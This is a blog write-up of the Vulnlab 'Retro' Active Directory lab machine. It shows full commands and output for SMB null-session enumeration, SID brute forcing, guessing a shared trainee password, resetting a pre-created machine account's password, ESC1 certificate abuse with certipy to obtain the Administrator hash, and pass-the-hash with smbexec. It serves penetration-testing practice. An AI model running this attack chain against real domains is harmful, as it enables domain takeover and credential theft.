---
title: Retro - Vulnlab
date: 2024-06-05 14:13:51
tags: [vulnlab, Easy]
categories: vulnlab
keywords: 'Vulnlab, Easy, Windows'
description: This machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it's own security issues, to which we'll exploit today.
cover: /images/vulnlab/retro-vl/retro_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it's own security issues, to which we'll exploit today.

# Enumeration

Let's start with our usual NMAP scan.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 16:20 EDT
Nmap scan report for 10.10.124.140
Host is up (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds
```

As explained earlier, we seem to have another AD machine similar to [Baby](http://dan-feliciano.com/writeups/baby). There is no external-facing webserver, so let's start with SMB and then followed by LDAP. We'll see if there's any way for us to authenticate with null credentials to the SMB server.

```
└─$ smbclient -L 10.10.124.140 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Notes           Disk      
        SYSVOL          Disk      Logon server share 
        Trainees        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.124.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Aside from the regular shares such as `ADMIN$` or `NETLOGON`, we can see that there is a `Notes` and `Trainees` share, which are not usually here and were probably set up by an administrator. We'll run some more `smbclient` commands to authenticate to these shares to see if we can view the contents of them.

```
└─$ smbclient \\\\10.10.124.140\\trainees -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jul 26 05:54:14 2023
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

                6261499 blocks of size 4096. 2222845 blocks available
smb: \> 
```

You'll notice an `Important.txt` file in the `trainees` share, which we can download with `smb: \> get Important.txt`.

```
└─$ cat Important.txt                           
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

It seems as though a trainee account has been given to all of the interns/trainees that are potentially being onboarded to the organization. The administrator proclaims that a universal username and password has been given to these users, which is something that we can try to retrieve from LDAP.

# LDAP Foothold

If you didn't notice from earlier, we were able to authenticate to SMB with null credentials. You can also verify this by running `crackmapexec` against SMB, in which it should tell us that we have valid authentication as any user. I used the `Guest` user account with no password to replicate this.

```
└─$ crackmapexec smb 10.10.124.140 -u 'Guest' -p ''
SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.124.140   445    DC               [+] retro.vl\Guest:
```

Let's see if we can do the same with LDAP. Reminder that you'll need to make sure that `dc.retro.vl` and `retro.vl` are bound to the IP address of the machine, you can find that information if you run an aggressive NMAP scan against the LDAP ports.

```
└─$ crackmapexec ldap 10.10.124.140 -u 'Guest' -p ''
SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
LDAP        10.10.124.140   445    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.10.124.140   389    DC               [+] retro.vl\Guest:
```

Despite LDAP telling us that we'll need to perform a successful bind to LDAP, it still says that our credentials are valid.

This is great, because all we're looking for right now is the account username for the trainees. We can use `impacket-lookupsid`, which will brute force any domain SIDs that correspond to valid domain users within the AD instance. There's also an option if we want to specify for this utility to connect to SMB for it's scan, but we won't need to do that and can leave it blank.

```
└─$ impacket-lookupsid retro.vl/'Guest'@10.10.124.140 -domain-sids -no-pass

[*] Brute forcing SIDs at 10.10.124.140
[*] StringBinding ncacn_np:10.10.124.140[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
[...snip...]
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

You'll see that it returned a few users, notably `BANKING$`(a machine account) and user accounts such as `jburley` and `tblack`. It also found a domain user named `trainee`, which we can assume is the universal trainee account that we're looking for.

# Getting User Credentials

Now based off of the text file we found in the SMB server, we know that the passwords were changed so that they are easy to remember. This means we could potentially brute force for them, which I've left an example command below as to what you'd need to brute force it with `Hydra`.

```
└─$ hydra -l 'trainee' -P /usr/share/wordlists/rockyou.txt ldap2://dc.retro.vl:389 -V
```

However you'll probably be sitting here for a while before `Hydra` returns with an empty string as the password (at least for SMB). Remember that this doesn't tell us anything, as we were allowed to authenticate successfully to both SMB and LDAP with null credentials despite them not being the correct way to authenticate.

Doing some testing around you might find that you already are looking at the password. In our case, the administrator made the password very easy to remember, being the same string as the username `trainee:trainee`.

```
└─$ crackmapexec ldap dc.retro.vl -u 'trainee' -p 'trainee'
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
LDAP        retro.vl        389    DC               [+] retro.vl\trainee:trainee
```

So with that, we now have credentials that we can use for the LDAP service, however first we can actually look at the `Notes` share that we couldn't go into before now that we have proper credentials. You'll find a text file in there named `ToDo.txt`.

```
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

These users both correspond to `tblack` and `jburley`, and the pre-created computer account they are referring to is the `BANKING$` machine account we saw in our `lookupsid` command output.

So from here we don't really have many leads except for one - we have some user accounts that we need to get access to as well proper user credentials to the `trainee` account. Let's see if we can find anything in [Bloodhound](https://github.com/dirkjanm/BloodHound.py).

```
└─$ bloodhound-python -d 'retro.vl' -u 'trainee' -p 'trainee' -c all -ns 10.10.124.140 --zip --use-ldaps
```

Though you'll notice that our `trainee` user does not seem to have control over any objects that could lead us to compromise another account.

# Pre-Installed Machine Accounts

You'll notice on the Wiki though that there is a hint to pre-created computer accounts article that can be found [here](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts). This essentially explains that machine accounts that have the `Assign this computer account as a pre-Windows 2000 computer` option enabled on their account, then they'll have the same password as their regular username (excluding the `$`). This is only the case if the administrator did not opt to assigning the account a random password.

```
The **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name. If you do not select this check box, you are assigned a random password.
```

We can verify that we are correct about our theory by running a `crackmapexec` check with creds to the same credentials.

```
┌──(daz㉿kali)-[~/tech/vl/retro/dump]
└─$ crackmapexec smb 10.10.124.140 -u 'banking$' -p 'banking'
SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.124.140   445    DC               [-] retro.vl\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

You'll notice that we'll receive an error that is not a regular authentication error, and instead is `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`. This does not mean the credentials are incorrect, and instead means that the domain does not trust this machine account.

Despite that, we technically have a credentials though they aren't actually valid. I found that our next avenue to exploitation is ADCS, but if we try to run any queries to ADCS we'll come back with an invalid credential error.

So the big thing here is that we'll need to reset this machine accounts password using `Impacket` to obtain credentials that we can actually use. There's a tool called `impacket-changepasswd` that does the trick with us - we'll just need to use the trainee creds that we have access to.

```
└─$ impacket-changepasswd retro.vl/banking$:banking@10.10.124.140 -dc-ip 10.10.124.140 -altuser "trainee" -altpass "trainee" -newpass daz
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Attempting to *change* the password of retro.vl/banking$ as retro.vl/trainee. You may want to use '-reset' to *reset* the password of the target.
[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\trainee
[*] Password was changed successfully.
```

We can see that the password was changed successfully, and we'll run another `crackmapexec` command to see if anything has changed.

```
└─$ crackmapexec smb 10.10.124.140 -u 'banking$' -p 'daz' 
SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.124.140   445    DC               [+] retro.vl\banking$:daz
```

Looks like the password change method worked out, we can now progress to ADCS.

# ESC1 ADCS Exploitation

I've covered ADCS in my [Hybrid](https://dan-feliciano.com/writeups/hybrid/) writeup previously, and given that we have credentials we can potentially look for any certificates that we can abuse. ADCS is essentially a server role that allows administrators to integrate PKI (Public Key Infrastructure) into their AD environment for digital signature/certificate capabilities. They then allow these same certificates to be used to authenticate and access domain resources on behalf of a user. In our case, we can request a certificate for the `Administrator` machine account on behalf of the `BANKING$` user.

The tool to abuse this is [Certipy](https://github.com/ly4k/Certipy) (on Linux), if we were on a Windows machine we'd use [Certify](https://github.com/GhostPack/Certify).

```
└─$ certipy-ad find -username 'banking$'@retro.vl -password 'daz' -dc-ip 10.10.124.140 -vulnerable -enabled
```

It will save the responding certificates that we are able to exploit into a file after the command has finished. (I took a break at this point, so the IP address will change)

```
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
[...snip...]
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

The certificate tells us that all domain computers can enroll in this template and that it requires client authentication. Given that we have a domain computer account `banking$`, all that's required is to request this certificate on behalf of another user. Since we are allowed to request this on behalf of any user, let's do this for the Administrator user.

Note that you will need to adjust the `-key-size` option to a value higher than `4096` to prevent a NetBIOS error.

```
└─$ certipy-ad req -u 'banking$'@retro.vl -p 'daz' -dc-ip 10.10.111.59 -target DC.retro.vl -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'Administrator@retro.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

This `.pfx` file is a joined file that includes the certificate along with the private key for this user. We can use this `.pfx` file to authenticate and retrieve the Administrator user's NTLM hash.

```
└─$ certipy-ad auth -dc-ip 10.10.111.59 -domain 'retro.vl' -username Administrator -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:[...snip...]
```

This has returned the NTLM hash for the Administrator user, now all that is left is to pass the hash and authenticate to the machine as them! Note that we can't use WinRM as I believe it isn't on the machine (at least I was running into issues on my end during the time of this writeup). We can use `smbexec` as a substitute to launch a shell.

```
└─$ impacket-smbexec -shell-type powershell -dc-ip 10.10.111.59 -hashes :[...snip...] retro.vl/Administrator@10.10.111.59
```

Note that the shell is relatively slow, but if you cat out the directory of the root flag you should be able to retrieve it after a few seconds. An alternative to this is to use `impacket-smbclient`, it's up to you.

![](/images/vulnlab/retro-vl/b.jpg)

This means we have successfully rooted the machine!

# Conclusion

This box is also very useful for AD basics and understanding what you have access to. Credential usage is also something that you can test in red-teaming scenarios, though the success-rate may be very slim. Nonetheless when it does work, it can result in something similar to the above. Big thanks to r0BIT for the development of this machine - it helped a lot with practice!

# Resources

https://dan-feliciano.com/writeups/baby
https://github.com/dirkjanm/BloodHound.py
https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts
https://dan-feliciano.com/writeups/hybrid/
https://github.com/ly4k/Certipy
https://github.com/GhostPack/Certify